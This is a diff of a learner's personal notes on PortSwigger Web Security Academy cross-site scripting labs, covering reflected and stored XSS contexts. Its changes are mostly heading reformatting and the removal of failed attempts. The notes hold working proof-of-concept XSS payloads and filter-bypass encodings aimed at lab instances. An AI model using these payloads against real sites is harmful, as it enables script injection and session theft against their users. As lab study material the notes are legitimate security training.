@@ -1,48 +1,48 @@
-# xss burp labs
+# **xss burp labs**
 https://portswigger.net/web-security/cross-site-scripting
 
 
-#### Reflected XSS
+# **Reflected XSS**
 https://portswigger.net/web-security/cross-site-scripting/reflected
 
 
 
-# Exploiting cross-site scripting vulnerabilities - 3 labs
+# **Exploiting cross-site scripting vulnerabilities - 3 labs**
 https://portswigger.net/web-security/cross-site-scripting/exploiting
 
-<!-- Exploiting cross-site scripting to steal cookies -->
+# ***1. Lab: Exploiting cross-site scripting to steal cookies***
 https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies
 // require burp colaborator - not solved
 
 
-<!-- Exploiting cross-site scripting to capture passwords -->
+# ***2. Lab: Exploiting cross-site scripting to capture passwords***
 https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-capturing-passwords
 // require burp colaborator - not solved
 
 
-<!-- Exploiting XSS to perform CSRF -->
+# ***3. Lab: Exploiting XSS to perform CSRF***
 https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf
 // not solved
 
 
 
-# Cross-site scripting contexts - 15 labs
+# **Cross-site scripting contexts - 15 labs**
 https://portswigger.net/web-security/cross-site-scripting/contexts
 
 
-<!-- Lab: Reflected XSS into HTML context with nothing encoded -->
+# ***1. Lab: Reflected XSS into HTML context with nothing encoded***
 https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded
 
 search field:
 <script>alert(1)</script>
 
-<!-- Lab: Stored XSS into HTML context with nothing encoded -->
+# ***2. Lab: Stored XSS into HTML context with nothing encoded***
 https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded
 
 test 1 - <script>alert(document.cookie)</script>
 
 
-<!-- Lab: Reflected XSS into HTML context with most tags and attributes blocked -->
+# ***3. Lab: Reflected XSS into HTML context with most tags and attributes blocked***
 https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked
 1. try baseline xss:
     GET /?search=<script>alert(1)</script> HTTP/1.1
@@ -66,10 +66,10 @@ https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-cont
 4. lets craft an html page with an iframe containig the search payload. the iframe also contains a command (executed on load) to resize its width - causing the payload to be fired:
     <iframe src="https://0ac8001d04a89eb9c0751d16007f0036.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
 
-POP!
+# POP!
 
 
-<!-- Lab: Reflected XSS into HTML context with all tags blocked except custom ones -->
+# ***4. Lab: Reflected XSS into HTML context with all tags blocked except custom ones***
 https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked
 1. try baseline xss:
 <script>alert(1)</script>
@@ -101,7 +101,7 @@ https://portswigger.net/research/one-xss-cheatsheet-to-rule-them-all
 
 
 
-<!-- Lab: Reflected XSS with event handlers and href attributes blocked -->
+# ***5. Lab: Reflected XSS with event handlers and href attributes blocked***
 https://portswigger.net/web-security/cross-site-scripting/contexts/lab-event-handlers-and-href-attributes-blocked
 
 label your vector with the word "Click":
@@ -146,7 +146,7 @@ https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#
 portswiggers payload (requiers user interaction)
 <svg><a><animate attributeName=href values=javascript:alert(2) /><text x=20 y=20>Click me</text></a>
 
-    <!-- breakdown:
+    # ***1. breakdown:
     <svg>   // whitelisted tag 
         <a>     // whitelisted tag ??? why need 2 tags?
             <animate attributeName=href values=javascript:alert(1) />
@@ -155,12 +155,12 @@ portswiggers payload (requiers user interaction)
 
 ==
 
-<!-- Lab: Reflected XSS with some SVG markup allowed -->
+# ***6. Lab: Reflected XSS with some SVG markup allowed***
 https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed
 
 <svg x=">" onload=alert(1)> 
 
-<!-- Lab: Reflected XSS into attribute with angle brackets HTML-encoded -->
+# ***7. Lab: Reflected XSS into attribute with angle brackets HTML-encoded***
 https://portswigger.net/web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded
 <script>alert(1)</script>
 reflects twice on page:
@@ -177,7 +177,7 @@ POP!
 
 
 
-<!-- Lab: Stored XSS into anchor href attribute with double quotes HTML-encoded -->
+# ***8. Lab: Stored XSS into anchor href attribute with double quotes HTML-encoded***
 https://portswigger.net/web-security/cross-site-scripting/contexts/lab-href-attribute-double-quotes-html-encoded
 
 
@@ -197,7 +197,7 @@ now we get clickble link that preform XSS POC
 
 POP!
 
-<!-- Lab: Reflected XSS in canonical link tag -->
+# ***9. Lab: Reflected XSS in canonical link tag***
 https://portswigger.net/web-security/cross-site-scripting/contexts/lab-canonical-link-tag
 
 for canonical manipultion lets try adding arbitary paramaeter to the URL:
@@ -242,7 +242,7 @@ reflection:
     ?tabindex=1+id=x+onfocus%3dalert(3) -->
 
 
-<!-- Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped -->
+# ***10. Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped***
 https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-single-quote-backslash-escaped
 
 hint:
@@ -270,7 +270,7 @@ reflection:
 
 POP!
 
-<!-- Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded -->
+# ***11. Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded***
 https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-html-encoded
 
 hints:
@@ -312,7 +312,7 @@ reflections:
 
 POP!
 
-<!-- Lab: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped -->
+# ***12. Lab: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped***
 https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-double-quotes-encoded-single-quotes-escaped
 
 test last payload:
@@ -339,7 +339,7 @@ payload:
     \';alert(document.domain)//
 
 
-<!-- Lab: Reflected XSS in a JavaScript URL with some characters blocked -->
+# ***13. Lab: Reflected XSS in a JavaScript URL with some characters blocked***
 https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-url-some-characters-blocked
 
 hint:
@@ -375,7 +375,7 @@ port solution:
 ???
 
 
-<!-- Lab: Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped -->
+# ***14. Lab: Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped***
 https://portswigger.net/web-security/cross-site-scripting/contexts/lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped
 
 try:
@@ -448,15 +448,16 @@ http://foo?&apos;-alert(1)-&apos;
 
 
 
-<!-- Lab: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped -->
+# ***15. Lab: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped***
 https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-template-literal-angle-brackets-single-double-quotes-backslash-backticks-escaped
 
-hint:
-    ${alert(document.domain)}
+hint: ${alert(document.domain)}
 
 try:
+```
 test`\
-ref:
+```
+reflection in response:
     <script>
         var message = `0 search results for 'test\u0060\u005c'`;
         document.getElementById('searchMessage').innerText = message;
@@ -470,18 +471,31 @@ ${alert(document.domain)}
 $) // just to close previous topic
 
 
-# AngularJS sandbox
-https://portswigger.net/web-security/cross-site-scripting/contexts/angularjs-sandbox
+
+# **Exploiting cross-site scripting vulnerabilities**
+https://portswigger.net/web-security/cross-site-scripting/exploiting
+
+# 1***. Lab: Exploiting cross-site scripting to steal cookies***
+https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies
+
+require pro
+# TBC
 
 
-<!-- Lab: Reflected XSS with AngularJS sandbox escape without strings -->
+# 2. ***Lab: Exploiting cross-site scripting to capture passwords***
+https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-capturing-passwords
 
-<script>angular.module('labApp', []).controller('vulnCtrl',function($scope, $parse) {
-    $scope.query = {};
-    var key = 'search';
-    $scope.query[key] = 'test';
-    $scope.value = $parse(key)($scope.query);
-});</script>
+require pro
+# TBC
+
+
+# ***3. Lab: Exploiting XSS to perform CSRF***
+https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf
+
+require pro
+# TBC
+
+
 
 
 
@@ -493,100 +507,19 @@ https://portswigger.net/web-security/cross-site-scripting/contexts/angularjs-san
 
 
 <!-- 
+# **AngularJS sandbox**
+https://portswigger.net/web-security/cross-site-scripting/contexts/angularjs-sandbox
 
 
-% <!-- failed attempts3:
-% found this field - it might reflect on canonical href link in header:
-% <input required type="hidden" name="postId" value="1">
+# ***1. Lab: Reflected XSS with AngularJS sandbox escape without strings***
 
-% reflection:
+<script>angular.module('labApp', []).controller('vulnCtrl',function($scope, $parse) {
+    $scope.query = {};
+    var key = 'search';
+    $scope.query[key] = 'test';
+    $scope.value = $parse(key)($scope.query);
+});</script>
 
-% HTTP/1.1 200 OK
-% Content-Type: text/html; charset=utf-8
-% Connection: close
-% Content-Length: 9037
+# TBC -->
 
-% <!DOCTYPE html>
-% <html>
-%     <head>
-%         <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
-%         <link href=/resources/css/labsBlog.css rel=stylesheet>
-%         <link rel="canonical" href='https://0acb007104d7d0f9c07124ee00810023.web-security-academy.net/post?postId=1'/>
-%         <title>
-
-
-% reflection:
-% <p><img src="/resources/images/avatarDefault.svg" class="avatar"><a id="author" href="http://test.com" rel="canonical">test</a> | 03 July 2022</p>
-
-
-
-
-
-
-% <link rel="canonical" href='https://0acb007104d7d0f9c07124ee00810023.web-security-academy.net/post?postId=3'/>
-
-% <button accesskey="h" title="Caption" id="btn1">Hover me</button> -->
-
-
-
- <!-- 
-% <!-- unsuccessful tries2
-% input:
-% name: injectable_input
-% reflection:
-% <p><img src="/resources/images/avatarDefault.svg" class="avatar">injectable_input | 03 July 2022</p>
-
-% 1st try the hint:
-% <a href="javascript:alert(document.domain)">click me</a>
-% reflected as: 
-% <p><img src="/resources/images/avatarDefault.svg" class="avatar">&lt;a href="javascript:alert(document.domain)"&gt;click me&lt;/a&gt; | 03 July 2022</p>
-
-% lets escape from <img> tag first:
-% <a href="javascript:alert()">click</a>
-
-
-
-
-
-% <a href=javascript:alert(2) /><text x=20 y=20>Click</text></a>
-
-
-
-% svg><a><animate attributeName=href values=javascript:alert(2) /><text x=20 y=20>Click me</text></a>
-
-% <input type="button" value="Login" onClick="pasuser(<parameters>)">
-
-% <section class="comment">
-%     <p><img src="/resources/images/avatarDefault.svg" class="avatar">name | date</p>
-%     <p>comment</p>
-% </section> -->
-
-
-
-
-<!-- unsuccessful tries:
-% <a id=x tabindex=1&#x26;#x20;onfocus=alert(1)>Click me</a>
-% <a id=x tabindex=1 (o\u006focus)=alert(1)>Click me</a>
-% <a (o\u006cliCk)=alert()
-
-
-% " " (space):
-% &#x20;      //hex
-% &#32;       //numeric
-
-% %u0020
-
-% "&" (ampersand):
-% &#x26;      //html hex
-% &#38;       //html numeric
-
-
-% "o"
-% &#111; //HTML encode numeric - browser decode relection
-% &#x6f; //HTML encode hex - - browser decode relection
-% %6f // URL encode
-% %u006f // URL encode unicode
-% \u006f // unicode escaping
-% \x6f //HEX escaping
-% \ --> -->
 
